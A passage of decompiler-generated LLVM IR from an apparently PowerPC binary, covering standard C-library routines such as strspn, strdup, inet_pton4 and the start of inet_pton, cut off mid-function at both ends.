  %v2_1000eb50 = load i8, i8* %v1_1000eb50, align 1
  %v1_1000eb54 = add i32 %v0_1000eb50, 1
  store i32 %v1_1000eb54, i32* %r11.global-to-local, align 4
  %v3_1000eb58 = icmp eq i8 %v2_1000eb50, 0
  store i1 %v3_1000eb58, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000eb58, label %dec_label_pc_1000eb60, label %dec_label_pc_1000eb50

dec_label_pc_1000eb60:                            ; preds = %dec_label_pc_1000eb50
  %v3_1000eb60 = icmp eq i32 %arg2, 3
  store i1 %v3_1000eb60, i1* %cr7_eq.global-to-local, align 1
  %v1_1000eb64 = add i32 %v0_1000eb50, -1
  store i32 %v1_1000eb64, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000ec00, label %dec_label_pc_1000eb70

dec_label_pc_1000eb70:                            ; preds = %dec_label_pc_1000eb60
  %v1_1000eb70 = udiv i32 %arg2, 4
  store i32 %v1_1000eb70, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000eb78

dec_label_pc_1000eb78:                            ; preds = %dec_label_pc_1000eb78.dec_label_pc_1000eb78_crit_edge, %dec_label_pc_1000eb70
  %v2_1000eb88 = phi i32 [ %v0_1000eb7c.pre, %dec_label_pc_1000eb78.dec_label_pc_1000eb78_crit_edge ], [ %v1_1000eb64, %dec_label_pc_1000eb70 ]
  %v0_1000eb78 = load i32, i32* @r4, align 4
  %v1_1000eb78 = inttoptr i32 %v0_1000eb78 to i8*
  %v2_1000eb78 = load i8, i8* %v1_1000eb78, align 1
  %v1_1000eb7c = add i32 %v2_1000eb88, 1
  store i32 %v1_1000eb7c, i32* %r9.global-to-local, align 4
  %v1_1000eb80 = add i32 %v2_1000eb88, 2
  store i32 %v1_1000eb80, i32* %r7.global-to-local, align 4
  %v3_1000eb84 = icmp eq i8 %v2_1000eb78, 0
  store i1 %v3_1000eb84, i1* %cr7_eq.global-to-local, align 1
  %v4_1000eb88 = inttoptr i32 %v1_1000eb7c to i8*
  store i8 %v2_1000eb78, i8* %v4_1000eb88, align 1
  %v0_1000eb8c = load i32, i32* @r4, align 4
  %v1_1000eb8c = add i32 %v0_1000eb8c, 1
  store i32 %v1_1000eb8c, i32* %r11.global-to-local, align 4
  %v0_1000eb90 = load i32, i32* @lr, align 4
  %v1_1000eb90 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000eb90, i32 %v0_1000eb90)
  %v0_1000eb94 = load i32, i32* @r4, align 4
  %v1_1000eb94 = add i32 %v0_1000eb94, 1
  %v2_1000eb94 = inttoptr i32 %v1_1000eb94 to i8*
  %v3_1000eb94 = load i8, i8* %v2_1000eb94, align 1
  %v0_1000eb98 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb98 = add i32 %v0_1000eb98, 1
  store i32 %v1_1000eb98, i32* %r8.global-to-local, align 4
  %v0_1000eb9c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000eb9c = add i32 %v0_1000eb9c, 1
  store i32 %v1_1000eb9c, i32* %r10.global-to-local, align 4
  %v3_1000eba0 = icmp eq i8 %v3_1000eb94, 0
  store i1 %v3_1000eba0, i1* %cr7_eq.global-to-local, align 1
  %v2_1000eba4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000eba4 = add i32 %v2_1000eba4, 1
  %v4_1000eba4 = inttoptr i32 %v3_1000eba4 to i8*
  store i8 %v3_1000eb94, i8* %v4_1000eba4, align 1
  %v0_1000eba8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000eba8 = add i32 %v0_1000eba8, 1
  store i32 %v1_1000eba8, i32* %r9.global-to-local, align 4
  %v1_1000ebac = add i32 %v0_1000eba8, 2
  store i32 %v1_1000ebac, i32* @r4, align 4
  %v0_1000ebb0 = load i32, i32* @lr, align 4
  %v1_1000ebb0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ebb0, i32 %v0_1000ebb0)
  %v0_1000ebb4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ebb4 = add i32 %v0_1000ebb4, 1
  %v2_1000ebb4 = inttoptr i32 %v1_1000ebb4 to i8*
  %v3_1000ebb4 = load i8, i8* %v2_1000ebb4, align 1
  %v0_1000ebb8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ebb8 = add i32 %v0_1000ebb8, 1
  store i32 %v1_1000ebb8, i32* %r11.global-to-local, align 4
  %v3_1000ebbc = icmp eq i8 %v3_1000ebb4, 0
  store i1 %v3_1000ebbc, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ebc0 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000ebc0 = add i32 %v2_1000ebc0, 1
  %v4_1000ebc0 = inttoptr i32 %v3_1000ebc0 to i8*
  store i8 %v3_1000ebb4, i8* %v4_1000ebc0, align 1
  %v0_1000ebc4 = load i32, i32* @lr, align 4
  %v1_1000ebc4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ebc4, i32 %v0_1000ebc4)
  %v0_1000ebc8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ebc8 = add i32 %v0_1000ebc8, 1
  %v2_1000ebc8 = inttoptr i32 %v1_1000ebc8 to i8*
  %v3_1000ebc8 = load i8, i8* %v2_1000ebc8, align 1
  %v4_1000ebc8 = zext i8 %v3_1000ebc8 to i32
  store i32 %v4_1000ebc8, i32* %r9.global-to-local, align 4
  %v3_1000ebcc = icmp eq i8 %v3_1000ebc8, 0
  store i1 %v3_1000ebcc, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ebd0 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000ebd0 = add i32 %v2_1000ebd0, 1
  %v4_1000ebd0 = inttoptr i32 %v3_1000ebd0 to i8*
  store i8 %v3_1000ebc8, i8* %v4_1000ebd0, align 1
  %v0_1000ebd4 = load i32, i32* @lr, align 4
  %v1_1000ebd4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ebd4, i32 %v0_1000ebd4)
  %v0_1000ebd8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ebd8 = add i32 %v0_1000ebd8, -1
  store i32 %v1_1000ebd8, i32* %ctr.global-to-local, align 4
  %v2_1000ebd8 = icmp eq i32 %v1_1000ebd8, 0
  br i1 %v2_1000ebd8, label %dec_label_pc_1000ebdc, label %dec_label_pc_1000eb78.dec_label_pc_1000eb78_crit_edge

dec_label_pc_1000eb78.dec_label_pc_1000eb78_crit_edge: ; preds = %dec_label_pc_1000eb78
  %v0_1000eb7c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eb78

dec_label_pc_1000ebdc:                            ; preds = %dec_label_pc_1000eb78
  %v0_1000ebdc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ebdc = urem i32 %v0_1000ebdc, 4
  store i32 %v1_1000ebdc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ec00

dec_label_pc_1000ebe4:                            ; preds = %dec_label_pc_1000ec00, %dec_label_pc_1000ebe4.dec_label_pc_1000ebe4_crit_edge
  %v0_1000ebe8 = phi i32 [ %v0_1000ebe8.pre, %dec_label_pc_1000ebe4.dec_label_pc_1000ebe4_crit_edge ], [ %v0_1000ec00, %dec_label_pc_1000ec00 ]
  %v0_1000ebe4 = load i32, i32* @r4, align 4
  %v1_1000ebe4 = inttoptr i32 %v0_1000ebe4 to i8*
  %v2_1000ebe4 = load i8, i8* %v1_1000ebe4, align 1
  %v3_1000ebe4 = zext i8 %v2_1000ebe4 to i32
  store i32 %v3_1000ebe4, i32* %r9.global-to-local, align 4
  %v1_1000ebe8 = add i32 %v0_1000ebe8, -1
  store i32 %v1_1000ebe8, i32* %r5.global-to-local, align 4
  %v1_1000ebec = add i32 %v0_1000ebe4, 1
  store i32 %v1_1000ebec, i32* @r4, align 4
  %v3_1000ebf0 = icmp eq i8 %v2_1000ebe4, 0
  store i1 %v3_1000ebf0, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ebf4 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000ebf4 = add i32 %v2_1000ebf4, 1
  %v4_1000ebf4 = inttoptr i32 %v3_1000ebf4 to i8*
  store i8 %v2_1000ebe4, i8* %v4_1000ebf4, align 1
  store i32 %v3_1000ebf4, i32* %r11.global-to-local, align 4
  %v0_1000ebf8 = load i32, i32* @lr, align 4
  %v1_1000ebf8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000ebf8, i32 %v0_1000ebf8)
  %v0_1000ec08 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ec08 = add i32 %v0_1000ec08, -1
  store i32 %v1_1000ec08, i32* %ctr.global-to-local, align 4
  %v2_1000ec08 = icmp eq i32 %v1_1000ec08, 0
  br i1 %v2_1000ec08, label %dec_label_pc_1000ec0c, label %dec_label_pc_1000ebe4.dec_label_pc_1000ebe4_crit_edge

dec_label_pc_1000ebe4.dec_label_pc_1000ebe4_crit_edge: ; preds = %dec_label_pc_1000ebe4
  %v0_1000ebe8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ebe4

dec_label_pc_1000ec00:                            ; preds = %dec_label_pc_1000eb60, %dec_label_pc_1000ebdc
  %v0_1000ec00 = phi i32 [ %arg2, %dec_label_pc_1000eb60 ], [ %v1_1000ebdc, %dec_label_pc_1000ebdc ]
  store i32 %v0_1000ec00, i32* %ctr.global-to-local, align 4
  %v2_1000ec083 = icmp eq i32 %v0_1000ec00, 0
  br i1 %v2_1000ec083, label %dec_label_pc_1000ec0c, label %dec_label_pc_1000ebe4

dec_label_pc_1000ec0c:                            ; preds = %dec_label_pc_1000ebe4, %dec_label_pc_1000ec00
  %v0_1000ec0c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ec0c = icmp eq i32 %v0_1000ec0c, 0
  store i1 %v3_1000ec0c, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ec10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ec0c, i32 %v0_1000ec10)
  %v0_1000ec14 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ec14 = trunc i32 %v0_1000ec14 to i8
  %v2_1000ec14 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000ec14 = add i32 %v2_1000ec14, 1
  %v4_1000ec14 = inttoptr i32 %v3_1000ec14 to i8*
  store i8 %v1_1000ec14, i8* %v4_1000ec14, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000ec00, { 1, 2, 0 }
  uselistorder i32 %v1_1000ec08, { 1, 0 }
  uselistorder i32 %v1_1000ebdc, { 1, 0 }
  uselistorder i32 %v1_1000ebd8, { 1, 0 }
  uselistorder i32 %v2_1000eb88, { 1, 0 }
  uselistorder i32 %v1_1000eb54, { 1, 0 }
  uselistorder i32 %v0_1000eb50, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000ec0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec00, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000ec4c1 = load i32, i32* @r3, align 4
  %v1_1000ec4c2 = inttoptr i32 %v0_1000ec4c1 to i8*
  %v2_1000ec4c3 = load i8, i8* %v1_1000ec4c2, align 1
  %v3_1000ec506 = icmp eq i8 %v2_1000ec4c3, 0
  br i1 %v3_1000ec506, label %dec_label_pc_1000ec60, label %dec_label_pc_1000ec58

dec_label_pc_1000ec28:                            ; preds = %dec_label_pc_1000ec28, %dec_label_pc_1000ec58
  %v0_1000ec28 = phi i32 [ %v1_1000ec2c, %dec_label_pc_1000ec28 ], [ %tmp, %dec_label_pc_1000ec58 ]
  %v1_1000ec28 = inttoptr i32 %v0_1000ec28 to i8*
  %v2_1000ec28 = load i8, i8* %v1_1000ec28, align 1
  %v1_1000ec2c = add i32 %v0_1000ec28, 1
  %v3_1000ec30 = icmp eq i8 %v2_1000ec28, 0
  %v4_1000ec34 = icmp eq i8 %v0_1000ec348.in, %v2_1000ec28
  %brmerge = or i1 %v3_1000ec30, %v4_1000ec34
  br i1 %brmerge, label %dec_label_pc_1000ec3c, label %dec_label_pc_1000ec28

dec_label_pc_1000ec3c:                            ; preds = %dec_label_pc_1000ec28
  br i1 %v3_1000ec30, label %dec_label_pc_1000ec60, label %dec_label_pc_1000ec44

dec_label_pc_1000ec44:                            ; preds = %dec_label_pc_1000ec3c
  %v1_1000ec44 = add i32 %v0_1000ec44, 1
  %v1_1000ec48 = add i32 %v0_1000ec48, 1
  %v1_1000ec4c = inttoptr i32 %v1_1000ec48 to i8*
  %v2_1000ec4c = load i8, i8* %v1_1000ec4c, align 1
  %v3_1000ec50 = icmp eq i8 %v2_1000ec4c, 0
  br i1 %v3_1000ec50, label %dec_label_pc_1000ec60, label %dec_label_pc_1000ec58

dec_label_pc_1000ec58:                            ; preds = %entry, %dec_label_pc_1000ec44
  %v0_1000ec48 = phi i32 [ %v1_1000ec48, %dec_label_pc_1000ec44 ], [ %v0_1000ec4c1, %entry ]
  %v0_1000ec44 = phi i32 [ %v1_1000ec44, %dec_label_pc_1000ec44 ], [ 0, %entry ]
  %v0_1000ec348.in = phi i8 [ %v2_1000ec4c, %dec_label_pc_1000ec44 ], [ %v2_1000ec4c3, %entry ]
  br label %dec_label_pc_1000ec28

dec_label_pc_1000ec60:                            ; preds = %dec_label_pc_1000ec44, %dec_label_pc_1000ec3c, %entry
  %v0_1000ec60 = phi i32 [ 0, %entry ], [ %v1_1000ec44, %dec_label_pc_1000ec44 ], [ %v0_1000ec44, %dec_label_pc_1000ec3c ]
  ret i32 %v0_1000ec60

; uselistorder directives
  uselistorder i32 %v0_1000ec28, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec58, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec28, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1000ec7c = call i32 @__GI_strlen()
  %v1_1000ec80 = add i32 %v0_1000ec7c, 1
  store i32 %v1_1000ec80, i32* @r29, align 4
  store i32 %v1_1000ec80, i32* @r3, align 4
  store i32 268496012, i32* @lr, align 4
  %v0_1000ec88 = call i32 @malloc()
  store i32 %v0_1000ec88, i32* @r3, align 4
  %v0_1000ec8c = load i32, i32* @r28, align 4
  store i32 %v0_1000ec8c, i32* @r4, align 4
  store i32 %v0_1000ec88, i32* @r31, align 4
  %v3_1000ec90 = icmp eq i32 %v0_1000ec88, 0
  %v0_1000ec94 = load i32, i32* @r29, align 4
  store i32 %v0_1000ec94, i32* @r5, align 4
  br i1 %v3_1000ec90, label %dec_label_pc_1000eca0, label %dec_label_pc_1000ec9c

dec_label_pc_1000ec9c:                            ; preds = %entry
  store i32 268496032, i32* @lr, align 4
  %v0_1000ec9c = call i32 @memcpy()
  %v0_1000eca4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000eca0

dec_label_pc_1000eca0:                            ; preds = %entry, %dec_label_pc_1000ec9c
  %v0_1000eca4 = phi i32 [ 0, %entry ], [ %v0_1000eca4.pre, %dec_label_pc_1000ec9c ]
  ret i32 %v0_1000eca4

; uselistorder directives
  uselistorder i32 ()* @malloc, { 0, 4, 3, 15, 14, 8, 7, 13, 12, 11, 10, 9, 6, 5, 2, 1 }
  uselistorder label %dec_label_pc_1000eca0, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000ecb8 = load i32, i32* @lr, align 4
  store i32 %v0_1000ecb8, i32* %r0.global-to-local, align 4
  %v0_1000ecc0 = call i32 @__asm_mfcr()
  store i32 %v0_1000ecc0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000eccc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000eccc, i32* %r7.global-to-local, align 4
  %v0_1000ecd0 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ed38

dec_label_pc_1000ece8:                            ; preds = %dec_label_pc_1000ed38
  %v3_1000ece8 = icmp eq i32 %v0_1000ed5c, 4
  store i1 %v3_1000ece8, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ecec = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000ecec, label %dec_label_pc_1000ed24, label %dec_label_pc_1000ecf0

dec_label_pc_1000ecf0:                            ; preds = %dec_label_pc_1000ece8
  %v0_1000ecf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000ecf0 = inttoptr i32 %v0_1000ecf0 to i8*
  %v2_1000ecf0 = load i8, i8* %v1_1000ecf0, align 1
  %v3_1000ecf0 = zext i8 %v2_1000ecf0 to i32
  %v1_1000ecf4 = mul nuw nsw i32 %v3_1000ecf0, 10
  %v1_1000ecf8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ecf8 = add i32 %v1_1000ecf4, %v1_1000ecf8
  %v1_1000ecfc = add i32 %v2_1000ecf8, -48
  store i32 %v1_1000ecfc, i32* %r0.global-to-local, align 4
  %v2_1000ed00 = icmp ugt i32 %v1_1000ecfc, 255
  %v3_1000ed00 = icmp eq i32 %v1_1000ecfc, 255
  store i1 %v3_1000ed00, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ed00, label %dec_label_pc_1000ed80, label %dec_label_pc_1000ed08

dec_label_pc_1000ed08:                            ; preds = %dec_label_pc_1000ecf0
  %v1_1000ed08 = trunc i32 %v1_1000ecfc to i8
  store i8 %v1_1000ed08, i8* %v1_1000ecf0, align 1
  %v0_1000ed0c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000ed0c, label %dec_label_pc_1000ed10, label %dec_label_pc_1000ed38.backedge

dec_label_pc_1000ed10:                            ; preds = %dec_label_pc_1000ed08
  %v0_1000ed10 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ed10 = add i32 %v0_1000ed10, 1
  store i32 %v1_1000ed10, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000ed18 = icmp sgt i32 %v1_1000ed10, 4
  %v3_1000ed18 = icmp eq i32 %v1_1000ed10, 4
  store i1 %v3_1000ed18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ed18, label %dec_label_pc_1000ed80, label %dec_label_pc_1000ed38.backedge

dec_label_pc_1000ed24:                            ; preds = %dec_label_pc_1000ece8
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1000ed28 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1000ed28.not = xor i1 %v0_1000ed28, true
  %v0_1000ed2c = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000ece8, %v0_1000ed2c
  %or.cond = or i1 %brmerge, %v0_1000ed28.not
  br i1 %or.cond, label %dec_label_pc_1000ed80, label %dec_label_pc_1000ed34

dec_label_pc_1000ed34:                            ; preds = %dec_label_pc_1000ed24
  %v0_1000ed34 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ed34 = trunc i32 %v0_1000ed34 to i8
  %v2_1000ed34 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000ed34 = add i32 %v2_1000ed34, 1
  %v4_1000ed34 = inttoptr i32 %v3_1000ed34 to i8*
  store i8 %v1_1000ed34, i8* %v4_1000ed34, align 1
  store i32 %v3_1000ed34, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000ed38.backedge

dec_label_pc_1000ed38.backedge:                   ; preds = %dec_label_pc_1000ed34, %dec_label_pc_1000ed08, %dec_label_pc_1000ed10
  %v0_1000ed38.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000ed3c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ed38

dec_label_pc_1000ed38:                            ; preds = %dec_label_pc_1000ed38.backedge, %entry
  %v0_1000ed3c = phi i32 [ %v0_1000ed3c.pre, %dec_label_pc_1000ed38.backedge ], [ 0, %entry ]
  %v0_1000ed40 = phi i32 [ %v0_1000ed38.pre, %dec_label_pc_1000ed38.backedge ], [ %v0_1000ecc0, %entry ]
  %v1_1000ed38 = inttoptr i32 %v0_1000ed40 to i8*
  %v2_1000ed38 = load i8, i8* %v1_1000ed38, align 1
  %v3_1000ed38 = zext i8 %v2_1000ed38 to i32
  store i32 %v3_1000ed38, i32* %r11.global-to-local, align 4
  %v3_1000ed3c = icmp eq i32 %v0_1000ed3c, 0
  store i1 %v3_1000ed3c, i1* %cr4_eq.global-to-local, align 1
  %v1_1000ed40 = add i32 %v0_1000ed40, 1
  store i32 %v1_1000ed40, i32* %r3.global-to-local, align 4
  %v3_1000ed44 = icmp eq i8 %v2_1000ed38, 0
  store i1 %v3_1000ed44, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ed48 = add nsw i32 %v3_1000ed38, -48
  store i32 %v1_1000ed48, i32* %r0.global-to-local, align 4
  %v2_1000ed4c = icmp ugt i32 %v1_1000ed48, 9
  store i1 %v2_1000ed4c, i1* %cr6_gt.global-to-local, align 1
  %v3_1000ed50 = icmp eq i8 %v2_1000ed38, 46
  store i1 %v3_1000ed50, i1* %cr1_eq.global-to-local, align 1
  %v0_1000ed54 = load i4, i4* @cr4, align 1
  %v1_1000ed54 = call %2 @__asm_mcrf_cr0_write(i4 %v0_1000ed54)
  %v4_1000ed54 = extractvalue %2 %v1_1000ed54, 2
  store i1 %v4_1000ed54, i1* %cr0_eq.global-to-local, align 1
  %v0_1000ed58 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ed5c = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_1000ed58, label %dec_label_pc_1000ed5c, label %dec_label_pc_1000ece8

dec_label_pc_1000ed5c:                            ; preds = %dec_label_pc_1000ed38
  %v3_1000ed5c = icmp eq i32 %v0_1000ed5c, 3
  store i1 %v3_1000ed5c, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1000ed5c, 4
  br i1 %tmp9, label %dec_label_pc_1000ed80, label %dec_label_pc_1000ed64

dec_label_pc_1000ed64:                            ; preds = %dec_label_pc_1000ed5c
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000eccc, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ed74.682 to i32), i32* @lr, align 4
  %v0_1000ed70 = call i32 @memcpy()
  br label %dec_label_pc_1000ed80

dec_label_pc_1000ed80:                            ; preds = %dec_label_pc_1000ed24, %dec_label_pc_1000ecf0, %dec_label_pc_1000ed10, %dec_label_pc_1000ed5c, %dec_label_pc_1000ed64
  %storemerge = phi i32 [ 1, %dec_label_pc_1000ed64 ], [ 0, %dec_label_pc_1000ed5c ], [ 0, %dec_label_pc_1000ed10 ], [ 0, %dec_label_pc_1000ecf0 ], [ 0, %dec_label_pc_1000ed24 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ecd0, i32* %r0.global-to-local, align 4
  %v1_1000ed90 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000ecc0)
  %v4_1000ed90 = extractvalue %0 %v1_1000ed90, 2
  store i1 %v4_1000ed90, i1* %cr0_eq.global-to-local, align 1
  %v9_1000ed90 = extractvalue %0 %v1_1000ed90, 7
  store i4 %v9_1000ed90, i4* @cr4, align 1
  %v0_1000ed94 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ed94

; uselistorder directives
  uselistorder i32 %v1_1000ed10, { 1, 0, 2 }
  uselistorder i32 %v1_1000ecfc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000ecc0, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 3, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000ed80, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ed38.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1000ed98 = icmp eq i32 %arg1, 2
  %v0_1000ed9c = load i32, i32* @lr, align 4
  store i32 %v0_1000ed9c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000ed98, label %dec_label_pc_1000edc4, label %dec_label_pc_1000edb8

dec_label_pc_1000edb8:                            ; preds = %entry
  %v3_1000edb8 = icmp eq i32 %arg1, 10
  br i1 %v3_1000edb8, label %dec_label_pc_1000edd8, label %dec_label_pc_1000ef74

dec_label_pc_1000edc4:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268496336, i32* @lr, align 4
  %v3_1000edcc = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_1000edcc, i32* %r3.global-to-local, align 4
  store i32 %v3_1000edcc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef8c

dec_label_pc_1000edd8:                            ; preds = %dec_label_pc_1000edb8
  %v2_1000edd8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000edd8, i32* %r3.global-to-local, align 4
  store i32 268496360, i32* @lr, align 4
  %v3_1000ede4 = call i32 @__GI_memset(i32 %v2_1000edd8, i32 0, i32 16)
  store i32 %v3_1000ede4, i32* %r3.global-to-local, align 4
  %v0_1000ede8 = load i32, i32* @r29, align 4
  %v1_1000ede8 = inttoptr i32 %v0_1000ede8 to i8*
  %v2_1000ede8 = load i8, i8* %v1_1000ede8, align 1
  %v3_1000ede8 = zext i8 %v2_1000ede8 to i32
  store i32 %v3_1000ede8, i32* %r0.global-to-local, align 4
  store i32 %v3_1000ede4, i32* @r31, align 4
  %v2_1000edf0 = add i32 %v3_1000ede4, 16
  store i32 %v2_1000edf0, i32* @r27, align 4
  %v3_1000edf4 = icmp eq i8 %v2_1000ede8, 58
  br i1 %v3_1000edf4, label %dec_label_pc_1000edfc, label %dec_label_pc_1000ee08

dec_label_pc_1000edfc:                            ; preds = %dec_label_pc_1000edd8
  %v1_1000edfc = add i32 %v0_1000ede8, 1
  %v2_1000edfc = inttoptr i32 %v1_1000edfc to i8*
  %v3_1000edfc = load i8, i8* %v2_1000edfc, align 1
  %v4_1000edfc = zext i8 %v3_1000edfc to i32
  store i32 %v4_1000edfc, i32* %r0.global-to-local, align 4
  store i32 %v1_1000edfc, i32* @r29, align 4
  %v3_1000ee00 = icmp eq i8 %v3_1000edfc, 58
  br i1 %v3_1000ee00, label %dec_label_pc_1000ee08, label %dec_label_pc_1000ef88

dec_label_pc_1000ee08:                            ; preds = %dec_label_pc_1000edfc, %dec_label_pc_1000edd8
  %v0_1000ee08 = phi i32 [ %v1_1000edfc, %dec_label_pc_1000edfc ], [ %v0_1000ede8, %dec_label_pc_1000edd8 ]
  store i32 %v0_1000ee08, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
